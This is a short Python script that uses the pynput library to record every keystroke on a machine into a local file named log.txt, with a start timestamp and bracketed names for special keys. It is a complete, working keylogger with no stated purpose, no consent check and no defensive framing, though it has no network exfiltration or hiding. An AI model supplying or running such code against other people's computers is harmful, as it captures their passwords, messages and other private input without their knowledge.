from pynput import keyboard
from datetime import datetime

log_file = "log.txt"

def on_press(key):
    try:
        # Convert key to character if possible
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(log_file, "a") as f:
            # Handle special keys like space, enter, etc.
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            else:
                f.write(f"[{key.name}]")  # show special keys in brackets

# Write timestamp only once when logger starts
with open(log_file, "a") as f:
    f.write(f"\n\n--- Logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
